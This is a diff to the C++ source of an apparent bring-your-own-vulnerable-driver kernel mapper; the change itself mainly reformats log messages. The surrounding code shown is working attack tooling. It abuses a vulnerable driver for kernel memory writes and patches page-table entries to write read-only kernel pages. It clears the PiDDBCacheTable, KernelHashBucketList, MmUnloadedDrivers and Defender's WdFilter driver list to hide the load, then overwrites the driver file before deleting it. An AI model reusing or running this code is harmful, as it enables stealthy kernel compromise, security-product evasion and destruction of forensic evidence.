@@ -21,11 +21,14 @@
 #include <fstream>
 #include <filesystem>
 #include <memory>
-#include <iostream> //Log() expands to std::wcout at the point of use
+#include <sstream>
+#include <vector>
+#include <iostream> //Log() writes through std::wcout at the point of use
 
 #include "Provider.hpp"
 #include "Resource.hpp"
 #include "../Utilities/Utilities.hpp"
+#include "../Utilities/Console.hpp"
 #include "../Service/Service.hpp"
 #include "../App/NT.hpp"
 #include "../PE/PE.hpp"
@@ -142,7 +145,7 @@ NTSTATUS Driver::AcquireDebugPrivilege() {
 NTSTATUS Driver::Load() {
 	srand((unsigned)time(NULL) * GetCurrentThreadId());
 
-	Log(L"[<] Using vulnerable driver provider: " << Provider::kShortName << L", device " << Provider::kDeviceName << std::endl);
+	Log(L"[!] Using vulnerable driver provider: " << Val(Provider::kShortName) << L", Device: " << Val(Provider::kDeviceName) << std::endl);
 
 	//If the provider driver is already running on the system (vendor software
 	//loaded it) we just reuse the existing device. No service registration,
@@ -151,7 +154,7 @@ NTSTATUS Driver::Load() {
 		Log(L"[+] Provider driver is already loaded, reusing the existing instance (no artifacts will be created)" << std::endl);
 	}
 	else {
-		Log(L"[<] Provider driver not running, loading it, Name: " << GetDriverNameW() << std::endl);
+		Log(L"[!] Provider driver not running, loading it, Name: " << Val(GetDriverNameW()) << std::endl);
 
 		std::wstring driver_path = GetDriverPath();
 		if (driver_path.empty()) {
@@ -173,6 +176,8 @@ NTSTATUS Driver::Load() {
 			return status;
 		}
 
+		//Separates the provider setup from the load result that follows.
+		LogBlank();
 		status = Service::RegisterAndStart(driver_path, GetDriverNameW());
 		if (!NT_SUCCESS(status)) {
 			Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
@@ -187,7 +192,7 @@ NTSTATUS Driver::Load() {
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
-		Log(L"[-] Failed to open the vulnerable driver device (" << Provider::kShortName << L")" << std::endl);
+		Log(L"[-] Failed to open the vulnerable driver device (" << Val(Provider::kShortName) << L")" << std::endl);
 		Log(L"[-] Note: the embedded driver resource (Resource.hpp) must contain the .sys binary of the selected provider." << std::endl);
 		Driver::Unload();
 		return STATUS_NOT_FOUND;
@@ -214,6 +219,7 @@ NTSTATUS Driver::Load() {
 		Log(L"[+] Structure offsets resolved from symbols for this build" << std::endl);
 	else
 		Log(L"[!] Structure offsets are using compiled defaults (unresolved fields are validated at runtime)" << std::endl);
+	LogBlank();
 
 	//Two steps, deliberately separate. ResolveMmPteBase reads the symbol, and
 	//ProbePteSelfMapBase chooses the base that is actually verified to index the
@@ -241,6 +247,7 @@ NTSTATUS Driver::Load() {
 	//mode they would all miss and fatal-abort. SeDebugPrivilege was also not
 	//acquired: it is only needed to register the service, which reuse skips.
 	//There is nothing of this run to clean, so the walks are skipped entirely.
+	LogBlank();
 	if (!g_driverWasLoadedByUs) {
 		Log(L"[*] Provider reused from a prior load, forensic cleanup skipped (provider name differs from this run)" << std::endl);
 		return STATUS_SUCCESS;
@@ -251,30 +258,33 @@ NTSTATUS Driver::Load() {
 		return STATUS_SUCCESS;
 	}
 
-	Log(L"[<] Stage 1/4: ClearPiDDBCacheTable" << std::endl);
+	Log(L"[!] Stage = 1/4 | ClearPiDDBCacheTable" << std::endl);
 	if (!Driver::ClearPiDDBCacheTable()) {
 		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
 		Driver::Unload();
 		return STATUS_DELETE_PENDING | 0x1000; //add custom value to error code to identify specific fail
 	}
+	LogBlank();
 
-	Log(L"[<] Stage 2/4: ClearKernelHashBucketList" << std::endl);
+	Log(L"[!] Stage = 2/4 | ClearKernelHashBucketList" << std::endl);
 	if (!Driver::ClearKernelHashBucketList()) {
 		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
 		Driver::Unload();
 		return STATUS_DELETE_PENDING | 0x2000;
 	}
+	LogBlank();
 
-	Log(L"[<] Stage 3/4: ClearMmUnloadedDrivers" << std::endl);
+	Log(L"[!] Stage = 3/4 | ClearMmUnloadedDrivers" << std::endl);
 	if (!Driver::ClearMmUnloadedDrivers()) {
-		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
+		Log(L"[-] Failed to ClearMmUnloadedDrivers" << std::endl);
 		Driver::Unload();
 		return STATUS_DELETE_PENDING | 0x3000;
 	}
+	LogBlank();
 
-	Log(L"[<] Stage 4/4: ClearWdFilterDriverList" << std::endl);
+	Log(L"[!] Stage = 4/4 | ClearWdFilterDriverList" << std::endl);
 	if (!Driver::ClearWdFilterDriverList()) {
-		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
+		Log("[-] Failed to ClearWdFilterDriverList" << std::endl);
 		Driver::Unload();
 		return STATUS_DELETE_PENDING | 0x4000;
 	}
@@ -467,7 +477,7 @@ bool Driver::ClearWdFilterDriverList() {
 
 	auto WdFilter = Utilities::GetKernelModuleAddress("WdFilter.sys");
 	if (!WdFilter) {
-		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
+		Log("[INFO] WdFilter.sys = NotLoaded | ClearSkipped = OK" << std::endl);
 		return true;
 	}
 
@@ -477,7 +487,7 @@ bool Driver::ClearWdFilterDriverList() {
 		//The offsets come from WdFilter's PDB, which is not always published.
 		//Treat a missing offset like the module not being loaded: skip the
 		//cleanup rather than failing the whole mapping over an optional module.
-		Log("[+] WdFilter offsets unavailable, clear skipped" << std::endl);
+		Log("[INFO] WdFilter offsets unavailable, clear skipped" << std::endl);
 		return true;
 	}
 	MpBmDocOpenRules += WdFilter;
@@ -504,7 +514,7 @@ bool Driver::ClearWdFilterDriverList() {
 	uint32_t runtime_list_offset = 0;
 
 	if (!FindWdFilterRuntimeDriverBlock(MpBmDocOpenRules, runtime_count_offset, runtime_array_offset, runtime_list_offset)) {
-		Log("[!] Could not locate the WdFilter runtime driver block by content; the layout of this "
+		Log("[-] Could not locate the WdFilter runtime driver block by content; the layout of this "
 			"WdFilter build is not understood and no kernel write will be attempted" << std::endl);
 		return false;
 	}
@@ -513,9 +523,9 @@ bool Driver::ClearWdFilterDriverList() {
 	const uintptr_t RuntimeDriversCount = MpBmDocOpenRules + runtime_count_offset;
 	uintptr_t RuntimeDriversArray = MpBmDocOpenRules + runtime_array_offset;
 
-	Log("[+] WdFilter runtime driver block located at count +0x" << std::hex << runtime_count_offset
-		<< L", array +0x" << runtime_array_offset
-		<< L", list head +0x" << runtime_list_offset << std::dec << std::endl);
+	Log(L"[+] WdFilter runtime driver block located at count " << Val(Hex(runtime_count_offset))
+		<< L", array " << Val(Hex(runtime_array_offset))
+		<< L", list head " << Val(Hex(runtime_list_offset)) << std::endl);
 
 	ULONG list_count = 0;
 	uintptr_t list_array = 0;
@@ -529,19 +539,19 @@ bool Driver::ClearWdFilterDriverList() {
 	}
 
 	if (list_count > kMaxWdFilterRuntimeDrivers) {
-		Log(L"[!] WdFilter runtime driver count " << list_count
+		Log(L"[-] WdFilter runtime driver count " << Val(list_count)
 			<< L" is implausible, refusing to touch the structure" << std::endl);
 		return false;
 	}
 
 	if (list_array < 0xFFFF000000000000ULL) {
-		Log(L"[!] WdFilter runtime driver array is not a kernel pointer, refusing to touch the structure" << std::endl);
+		Log(L"[-] WdFilter runtime driver array is not a kernel pointer, refusing to touch the structure" << std::endl);
 		return false;
 	}
 
 	if (reinterpret_cast<uintptr_t>(list_head.Flink) < 0xFFFF000000000000ULL ||
 		reinterpret_cast<uintptr_t>(list_head.Blink) < 0xFFFF000000000000ULL) {
-		Log(L"[!] WdFilter runtime driver list head links are not kernel pointers, refusing to touch the structure" << std::endl);
+		Log(L"[-] WdFilter runtime driver list head links are not kernel pointers, refusing to touch the structure" << std::endl);
 		return false;
 	}
 
@@ -550,7 +560,7 @@ bool Driver::ClearWdFilterDriverList() {
 	uintptr_t MpFreeDriverInfoEx = SymbolsHandler::GetInstance()->GetOffset(L"MpFreeDriverInfoEx");
 	if (!MpFreeDriverInfoEx)
 	{
-		Log("[+] WdFilter offsets unavailable, clear skipped" << std::endl);
+		Log("[INFO] WdFilter offsets unavailable, clear skipped" << std::endl);
 		return true;
 	}
 	MpFreeDriverInfoEx += WdFilter;
@@ -575,7 +585,7 @@ bool Driver::ClearWdFilterDriverList() {
 			//out of this entry, so continuing would either spin on a null (an
 			//endless loop holding the walk) or hand the provider an address that
 			//faults. Stop here.
-			Log("[!] WdFilter runtime driver list entry is not a kernel pointer, the located offsets do not match this WdFilter build" << std::endl);
+			Log("[-] WdFilter runtime driver list entry is not a kernel pointer, the located offsets do not match this WdFilter build" << std::endl);
 			break;
 		}
 
@@ -622,7 +632,7 @@ bool Driver::ClearWdFilterDriverList() {
 				}
 
 					if (!removedRuntimeDriversArray) {
-						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
+						Log("[-] Failed to remove from RuntimeDriversArray" << std::endl);
 						return false;
 					}
 
@@ -650,13 +660,13 @@ bool Driver::ClearWdFilterDriverList() {
 					USHORT Magic = 0;
 					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
 					if (Magic != 0xDA18) {
-						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
+						Log("[-] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
 					}
 					else {
 						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
 					}
 
-					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
+					Log(L"[+] WdFilterDriverList Cleaned: " << Val(ImageName.get()) << std::endl);
 					return true;
 				}
 			}
@@ -685,7 +695,8 @@ bool Driver::ClearWdFilterDriverList() {
 static constexpr uintmax_t kMaxDriverOverwriteSize = 64u * 1024u * 1024u;
 
 NTSTATUS Driver::Unload() {
-	Log(L"[<] Unloading vulnerable driver" << std::endl);
+	LogBlank();
+	Log(L"[!] Unloading vulnerable driver" << std::endl);
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
 		CloseHandle(hDevice);
@@ -700,6 +711,7 @@ NTSTATUS Driver::Unload() {
 	auto status = Service::StopAndRemove(GetDriverNameW());
 	if (!NT_SUCCESS(status))
 		return status;
+	LogBlank();
 
 	std::wstring driver_path = GetDriverPath();
 
@@ -723,17 +735,17 @@ NTSTATUS Driver::Unload() {
 	const auto original_size = std::filesystem::file_size(driver_path, size_error);
 
 	if (size_error || original_size == 0) {
-		Log(L"[!] Can't determine the size of the driver file, skipping the overwrite before unlink" << std::endl);
+		Log(L"[-] Can't determine the size of the driver file, skipping the overwrite before unlink" << std::endl);
 	}
 	else if (original_size > kMaxDriverOverwriteSize) {
-		Log(L"[!] Driver file is unexpectedly large (" << original_size << L" bytes), skipping the overwrite before unlink" << std::endl);
+		Log(L"[-] Driver file is unexpectedly large (" << Val(original_size) << L" bytes), skipping the overwrite before unlink" << std::endl);
 	}
 	else {
 		//in|out without trunc: the file is not resized, so the write lands on the
 		//clusters that already hold the image.
 		std::fstream file_stream(driver_path.c_str(), std::ios_base::in | std::ios_base::out | std::ios_base::binary);
 		if (!file_stream.is_open()) {
-			Log(L"[!] Error opening driver file to dump random data inside the disk" << std::endl);
+			Log(L"[-] Error opening driver file to dump random data inside the disk" << std::endl);
 			return STATUS_DELETE_PENDING;
 		}
 
@@ -746,11 +758,11 @@ NTSTATUS Driver::Unload() {
 		file_stream.close();
 
 		if (!file_stream) {
-			Log(L"[!] Error dumping random data over the driver file" << std::endl);
+			Log(L"[-] Error dumping random data over the driver file" << std::endl);
 			return STATUS_DELETE_PENDING;
 		}
 
-		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
+		Log(L"[+] Vulnerable driver data destroyed before unlink." << std::endl);
 	}
 
 	//unlink the file
@@ -999,13 +1011,13 @@ static bool ResolveMmPteBase() {
 	if ((pte_base & kKernelHalf) != kKernelHalf ||
 		(pte_base & kLowIndexBits) != 0 ||
 		index < 0x100ULL || index > 0x1FFULL) {
-		Log(L"[!] nt!MmPteBase held a value that is not a self-map base 0x"
-			<< reinterpret_cast<void*>(pte_base) << L" (index 0x" << std::hex << index << std::dec << L")" << std::endl);
+		Log(L"[-] nt!MmPteBase held a value that is not a self-map base "
+			<< Val(reinterpret_cast<void*>(pte_base)) << L" (index " << Val(Hex(index)) << L")" << std::endl);
 		return false;
 	}
 
 	g_mmPteBase = pte_base;
-	Log(L"[+] nt!MmPteBase holds 0x" << reinterpret_cast<void*>(pte_base) << std::endl);
+	Log(L"[+] nt!MmPteBase holds " << Val(reinterpret_cast<void*>(pte_base)) << std::endl);
 	return true;
 }
 
@@ -1074,17 +1086,28 @@ static bool ProbePteSelfMapBase() {
 	GlobalMemoryStatusEx(&ms);
 	const uint64_t max_pfn = ms.ullTotalPhys / 0x1000;
 
+	/*
+	 * The per-entry detail is buffered rather than printed as each value is
+	 * computed: the success line summarises the same entries, and it is printed
+	 * first, so the detail it summarises follows it instead of preceding it.
+	 */
+	std::vector<std::wstring> probe_details;
+
 	// --- 4K level: KUSER_SHARED_DATA ---
 	uint64_t kusd_pte = 0;
 	const uint64_t kusd_pte_addr = PteAddressForBase(g_mmPteBase, kUserSharedData);
 	const bool kusd_read = Driver::ReadMemory(kusd_pte_addr, &kusd_pte, sizeof(kusd_pte));
-	Log(L"[i] KUSER_SHARED_DATA PTE 0x" << std::hex << kusd_pte
-		<< L" present=" << (kusd_pte & 1)
-		<< L" rw=" << ((kusd_pte >> 1) & 1)
-		<< L" user=" << ((kusd_pte >> 2) & 1)
-		<< L" large=" << ((kusd_pte >> 7) & 1)
-		<< L" pfn=0x" << ((kusd_pte >> 12) & 0xFFFFFFFFFULL)
-		<< L" addr=0x" << kusd_pte_addr << std::dec << std::endl);
+	{
+		std::wostringstream detail;
+		detail << L"[INFO] KUSER_SHARED_DATA PTE = " << Val(Hex(kusd_pte))
+			<< L" | Present = " << Val(kusd_pte & 1)
+			<< L" | RW = " << Val((kusd_pte >> 1) & 1)
+			<< L" | User = " << Val((kusd_pte >> 2) & 1)
+			<< L" | Large = " << Val((kusd_pte >> 7) & 1)
+			<< L" | PFN = " << Val(Hex((kusd_pte >> 12) & 0xFFFFFFFFFULL))
+			<< L" | Addr = " << Val(Hex(kusd_pte_addr));
+		probe_details.push_back(detail.str());
+	}
 
 	const uint64_t kusd_pfn = (kusd_pte >> 12) & 0xFFFFFFFFFULL;
 	const bool kusd_ok = kusd_read && (kusd_pte & 0x1) && !(kusd_pte & 0x4) && !(kusd_pte & (1ULL << 7)) &&
@@ -1095,13 +1118,17 @@ static bool ProbePteSelfMapBase() {
 	uint64_t nt_pde = 0;
 	const uint64_t nt_pde_addr = PdeAddressForBase(pde_base, Driver::ntoskrnlAddr);
 	const bool nt_pde_read = Driver::ReadMemory(nt_pde_addr, &nt_pde, sizeof(nt_pde));
-	Log(L"[i] ntoskrnl base PDE 0x" << std::hex << nt_pde
-		<< L" present=" << (nt_pde & 1)
-		<< L" rw=" << ((nt_pde >> 1) & 1)
-		<< L" user=" << ((nt_pde >> 2) & 1)
-		<< L" large=" << ((nt_pde >> 7) & 1)
-		<< L" pfn=0x" << ((nt_pde >> 12) & 0xFFFFFFFFFULL)
-		<< L" addr=0x" << nt_pde_addr << std::dec << std::endl);
+	{
+		std::wostringstream detail;
+		detail << L"[INFO] ntoskrnl base PDE = " << Val(Hex(nt_pde))
+			<< L" | Present = " << Val(nt_pde & 1)
+			<< L" | RW = " << Val((nt_pde >> 1) & 1)
+			<< L" | User = " << Val((nt_pde >> 2) & 1)
+			<< L" | Large = " << Val((nt_pde >> 7) & 1)
+			<< L" | PFN = " << Val(Hex((nt_pde >> 12) & 0xFFFFFFFFFULL))
+			<< L" | Addr = " << Val(Hex(nt_pde_addr));
+		probe_details.push_back(detail.str());
+	}
 
 	const uint64_t nt_pde_pfn = (nt_pde >> 12) & 0xFFFFFFFFFULL;
 	const bool nt_2mb_ok = nt_pde_read && (nt_pde & 0x1) && !(nt_pde & 0x4) && (nt_pde & (1ULL << 7)) &&
@@ -1113,11 +1140,13 @@ static bool ProbePteSelfMapBase() {
 	const uint64_t nt_pte_addr = PteAddressForBase(g_mmPteBase, Driver::ntoskrnlAddr);
 	const bool nt_pte_read = Driver::ReadMemory(nt_pte_addr, &nt_pte, sizeof(nt_pte));
 	if (!nt_2mb_ok) {
-		Log(L"[i] ntoskrnl base PTE 0x" << std::hex << nt_pte
-			<< L" present=" << (nt_pte & 1)
-			<< L" user=" << ((nt_pte >> 2) & 1)
-			<< L" large=" << ((nt_pte >> 7) & 1)
-			<< L" addr=0x" << nt_pte_addr << std::dec << std::endl);
+		std::wostringstream detail;
+		detail << L"[INFO] ntoskrnl base PTE = " << Val(Hex(nt_pte))
+			<< L" | Present = " << Val(nt_pte & 1)
+			<< L" | User = " << Val((nt_pte >> 2) & 1)
+			<< L" | Large = " << Val((nt_pte >> 7) & 1)
+			<< L" | Addr = " << Val(Hex(nt_pte_addr));
+		probe_details.push_back(detail.str());
 	}
 	const uint64_t nt_pte_pfn = (nt_pte >> 12) & 0xFFFFFFFFFULL;
 	const bool nt_4k_ok = nt_pte_read && (nt_pte & 0x1) && !(nt_pte & 0x4) && !(nt_pte & (1ULL << 7)) &&
@@ -1148,26 +1177,41 @@ static bool ProbePteSelfMapBase() {
 
 	const bool kusd_pfn_match = kusd_ok && kusd_user_ok && (kusd_pfn == kusd_user_pfn);
 
-	Log(L"[i] KUSER_SHARED_DATA dual map: kernel pfn=0x" << std::hex << kusd_pfn
-		<< L" user pfn=0x" << kusd_user_pfn << L" user_addr=0x" << kusd_user_pte_addr
-		<< std::dec << L" pfn_match=" << (kusd_pfn_match ? L"yes" : L"no") << std::endl);
+	{
+		std::wostringstream detail;
+		detail << L"[INFO] KUSER_SHARED_DATA dual map | KernelPFN = " << Val(Hex(kusd_pfn))
+			<< L" | UserPFN = " << Val(Hex(kusd_user_pfn))
+			<< L" | UserAddr = " << Val(Hex(kusd_user_pte_addr))
+			<< L" | PFNMatch = " << Val(kusd_pfn_match ? L"yes" : L"no");
+		probe_details.push_back(detail.str());
+	}
 
-	Log(L"[i] self-map summary: KUSER_SHARED_DATA 4K " << (kusd_ok ? L"ok" : L"bad")
-		<< L", dual-map pfn " << (kusd_pfn_match ? L"match" : L"MISMATCH")
-		<< L", ntoskrnl " << (nt_2mb_ok ? L"2MB-leaf" : (nt_4k_ok ? L"4K-leaf" : L"bad")) << std::endl);
+	{
+		std::wostringstream detail;
+		detail << L"[INFO] self-map summary | KUSER_SHARED_DATA 4K " << Val(kusd_ok ? L"OK" : L"bad")
+			<< L" | dual-map PFN " << Val(kusd_pfn_match ? L"match" : L"MISMATCH")
+			<< L" | ntoskrnl " << Val(nt_2mb_ok ? L"2MB leaf" : (nt_4k_ok ? L"4K leaf" : L"bad"));
+		probe_details.push_back(detail.str());
+	}
 
 	if (kusd_ok && kusd_pfn_match && nt_ok) {
 		g_pteSelfMapBase = g_mmPteBase;
 		g_pdeSelfMapBase = pde_base;
 		g_pteSelfMapReady = true;
-		Log(L"[+] Kernel PTE self-map verified: PTE base 0x" << std::hex << g_pteSelfMapBase
-			<< L", PDE base 0x" << g_pdeSelfMapBase << std::dec
-			<< L" (KUSER_SHARED_DATA 4K leaf ok, ntoskrnl "
-			<< (nt_2mb_ok ? L"2MB leaf" : L"4K leaf") << L" ok)" << std::endl);
+		Log(L"[+] Kernel PTE self-map verified: PTE base = " << Val(Hex(g_pteSelfMapBase))
+			<< L" | PDE base = " << Val(Hex(g_pdeSelfMapBase))
+			<< L" | KUSER_SHARED_DATA 4K leaf " << Val(L"OK")
+			<< L" | ntoskrnl " << Val(nt_2mb_ok ? L"2MB leaf" : L"4K leaf") << L" OK" << std::endl);
+		//Separates the verified summary from the per-entry detail it summarises.
+		LogBlank();
+		for (const auto& detail : probe_details)
+			Log(detail << std::endl);
 		return true;
 	}
 
 	Log(L"[-] Kernel PTE self-map could not be verified, writes to read-only pages are disabled" << std::endl);
+	for (const auto& detail : probe_details)
+		Log(detail << std::endl);
 	return false;
 }
 
@@ -1213,17 +1257,19 @@ static bool ProbePteSelfMapBase() {
 		uint32_t patched_count = 0;
 
 		if (page_count > 16) {
-			Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << page_count << L")" << std::endl);
+			Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << Val(page_count) << L")" << std::endl);
 			return false;
 		}
 
 		//Restores every entry recorded in patched[0 .. patched_count). Called on
 		//every exit path after the first successful patch, so a failure part way
-		//through cannot leave kernel pages writable.
+		//through cannot leave kernel pages writable. The per-entry line is
+		//verbose-only: on a normal run it would print the same entry many times.
 		auto restore_patched_entries = [&]() {
 			for (uint32_t i = 0; i < patched_count; ++i) {
 				WriteMemory(patched[i].entry_address, &patched[i].original, sizeof(patched[i].original));
-				Log(L"[!] Restored page-table entry at 0x" << reinterpret_cast<void*>(patched[i].entry_address) << std::endl);
+				if (Console::Verbose())
+					Log(L"[INFO] Restored page-table entry at " << Val(reinterpret_cast<void*>(patched[i].entry_address)) << std::endl);
 			}
 		};
 
@@ -1242,7 +1288,7 @@ static bool ProbePteSelfMapBase() {
 			const uint64_t pde_address = PdeAddressFor(target);
 			uint64_t pde = 0;
 			if (!ReadMemory(pde_address, &pde, sizeof(pde))) {
-				Log(L"[-] Failed to read PDE at 0x" << reinterpret_cast<void*>(pde_address) << std::endl);
+				Log(L"[-] Failed to read PDE at " << Val(reinterpret_cast<void*>(pde_address)) << std::endl);
 				restore_patched_entries();
 				return false;
 			}
@@ -1261,19 +1307,19 @@ static bool ProbePteSelfMapBase() {
 
 			uint64_t original = 0;
 			if (!ReadMemory(entry_address, &original, sizeof(original))) {
-				Log(L"[-] Failed to read page-table entry at 0x" << reinterpret_cast<void*>(entry_address) << std::endl);
+				Log(L"[-] Failed to read page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
 				restore_patched_entries();
 				return false;
 			}
 
 			if (!(original & 0x1)) {
-				Log(L"[-] Page-table entry 0x" << std::hex << original << std::dec
-					<< L" at 0x" << reinterpret_cast<void*>(entry_address) << L" is not present" << std::endl);
+				Log(L"[-] Page-table entry " << Val(Hex(original))
+					<< L" at " << Val(reinterpret_cast<void*>(entry_address)) << L" is not present" << std::endl);
 				restore_patched_entries();
 				return false;
 			}
 			if (!large && (original & (1ULL << 7))) {
-				Log(L"[-] Unexpected large-page PTE at 0x" << reinterpret_cast<void*>(entry_address) << std::endl);
+				Log(L"[-] Unexpected large-page PTE at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
 				restore_patched_entries();
 				return false;
 			}
@@ -1285,7 +1331,7 @@ static bool ProbePteSelfMapBase() {
 			//Recorded before the write succeeds, so the restore always undoes
 			//exactly what was done.
 			if (!WriteMemory(entry_address, &patched_value, sizeof(patched_value))) {
-				Log(L"[-] Failed to patch page-table entry at 0x" << reinterpret_cast<void*>(entry_address) << std::endl);
+				Log(L"[-] Failed to patch page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
 				restore_patched_entries();
 				return false;
 			}
@@ -1324,7 +1370,7 @@ static bool ProbePteSelfMapBase() {
 		restore_patched_entries();
 
 		if (!result)
-			Log(L"[-] Write through patched page-table entry failed for 0x" << reinterpret_cast<void*>(address) << std::endl);
+			Log(L"[-] Write through patched page-table entry failed for " << Val(reinterpret_cast<void*>(address)) << std::endl);
 
 		return result;
 	}
@@ -1342,7 +1388,7 @@ uint64_t Driver::MmAllocateIndependentPagesEx(uint32_t size)
 	{
 		kernel_MmAllocateIndependentPagesEx = SymbolsHandler::GetInstance()->GetOffset(L"MmAllocateIndependentPagesEx");
 		if (!kernel_MmAllocateIndependentPagesEx) {
-			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
+			Log(L"[-] Failed to find MmAllocateIndependentPagesEx" << std::endl);
 			return 0;
 		}
 		kernel_MmAllocateIndependentPagesEx += Driver::ntoskrnlAddr;
@@ -1362,7 +1408,7 @@ bool Driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 	{
 		kernel_MmFreeIndependentPages = SymbolsHandler::GetInstance()->GetOffset(L"MmFreeIndependentPages");
 		if (!kernel_MmFreeIndependentPages) {
-			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
+			Log(L"[-] Failed to find MmFreeIndependentPages" << std::endl);
 			return false;
 		}
 		kernel_MmFreeIndependentPages += Driver::ntoskrnlAddr;
@@ -1379,7 +1425,7 @@ BOOLEAN Driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_p
 {
 	if (!address)
 	{
-		Log(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
+		Log(L"[-] Invalid address passed to MmSetPageProtection" << std::endl);
 		return FALSE;
 	}
 
@@ -1389,7 +1435,7 @@ BOOLEAN Driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_p
 	{
 		kernel_MmSetPageProtection = SymbolsHandler::GetInstance()->GetOffset(L"MmSetPageProtection");
 		if (!kernel_MmSetPageProtection) {
-			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
+			Log(L"[-] Failed to find MmSetPageProtection" << std::endl);
 			return FALSE;
 		}
 		kernel_MmSetPageProtection += Driver::ntoskrnlAddr;
@@ -1413,7 +1459,7 @@ uint64_t Driver::AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size) {
 	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 
 	if (!kernel_ExAllocatePool) {
-		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
+		Log(L"[-] Failed to find ExAllocatePool" << std::endl);
 		return 0;
 	}
 
@@ -1433,7 +1479,7 @@ bool Driver::FreePool(uint64_t address) {
 	static uint64_t kernel_ExFreePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExFreePool");
 
 	if (!kernel_ExFreePool) {
-		Log(L"[!] Failed to find ExFreePool" << std::endl);
+		Log(L"[-] Failed to find ExFreePool" << std::endl);
 		return false;
 	}
 
@@ -1723,43 +1769,43 @@ bool Driver::ClearMmUnloadedDrivers() {
 	uint64_t device_object = 0;
 
 	if (!ReadMemory(object + g_offsets.FileObject_DeviceObject, &device_object, sizeof(device_object)) || !device_object) {
-		Log(L"[!] Failed to find device_object (offset 0x" << std::hex << g_offsets.FileObject_DeviceObject << std::dec << L")" << std::endl);
+		Log(L"[-] Failed to find device_object (offset " << Val(Hex(g_offsets.FileObject_DeviceObject)) << L")" << std::endl);
 		return false;
 	}
 	if (!IsKernelAddress(device_object)) {
-		Log(L"[!] device_object is not a kernel address, the offsets do not match this build" << std::endl);
+		Log(L"[-] device_object is not a kernel address, the offsets do not match this build" << std::endl);
 		return false;
 	}
 
 	uint64_t driver_object = 0;
 
 	if (!ReadMemory(device_object + g_offsets.DeviceObject_DriverObject, &driver_object, sizeof(driver_object)) || !driver_object) {
-		Log(L"[!] Failed to find driver_object (offset 0x" << std::hex << g_offsets.DeviceObject_DriverObject << std::dec << L")" << std::endl);
+		Log(L"[-] Failed to find driver_object (offset " << Val(Hex(g_offsets.DeviceObject_DriverObject)) << L")" << std::endl);
 		return false;
 	}
 	if (!IsKernelAddress(driver_object)) {
-		Log(L"[!] driver_object is not a kernel address, the offsets do not match this build" << std::endl);
+		Log(L"[-] driver_object is not a kernel address, the offsets do not match this build" << std::endl);
 		return false;
 	}
 
 	uint64_t driver_section = 0;
 
 	if (!ReadMemory(driver_object + g_offsets.DriverObject_DriverSection, &driver_section, sizeof(driver_section)) || !driver_section) {
-		Log(L"[!] Failed to find driver_section (offset 0x" << std::hex << g_offsets.DriverObject_DriverSection << std::dec << L")" << std::endl);
+		Log(L"[-] Failed to find driver_section (offset " << Val(Hex(g_offsets.DriverObject_DriverSection)) << L")" << std::endl);
 		return false;
 	}
 	//driver_section is the KLDR_DATA_TABLE_ENTRY the name is read out of, so a
 	//value that is not a kernel pointer would be dereferenced straight into the
 	//provider. Refuse instead.
 	if (!IsKernelAddress(driver_section)) {
-		Log(L"[!] driver_section is not a kernel address, the offsets do not match this build" << std::endl);
+		Log(L"[-] driver_section is not a kernel address, the offsets do not match this build" << std::endl);
 		return false;
 	}
 
 	UNICODE_STRING us_driver_base_dll_name = { 0 };
 
 	if (!ReadMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
-		Log(L"[!] Failed to find driver name (offset 0x" << std::hex << g_offsets.LdrEntry_BaseDllName << std::dec << L")" << std::endl);
+		Log(L"[-] Failed to find driver name (offset " << Val(Hex(g_offsets.LdrEntry_BaseDllName)) << L")" << std::endl);
 		return false;
 	}
 
@@ -1769,13 +1815,13 @@ bool Driver::ClearMmUnloadedDrivers() {
 		us_driver_base_dll_name.Length > 1024 ||
 		us_driver_base_dll_name.Length % sizeof(wchar_t) != 0 ||
 		us_driver_base_dll_name.MaximumLength < us_driver_base_dll_name.Length) {
-		Log(L"[!] Driver name structure does not look valid, refusing to write" << std::endl);
+		Log(L"[-] Driver name structure does not look valid, refusing to write" << std::endl);
 		return false;
 	}
 
 	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
 	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
-		Log(L"[!] Failed to read driver name" << std::endl);
+		Log(L"[-] Failed to read driver name" << std::endl);
 		return false;
 	}
 
@@ -1793,7 +1839,7 @@ bool Driver::ClearMmUnloadedDrivers() {
 	//and GetDriverNameW draws from both cases.
 	std::wstring found_name(unloadedName.get());
 	if (found_name.empty() || found_name.size() > 64) {
-		Log(L"[!] Driver name is implausible, refusing to write" << std::endl);
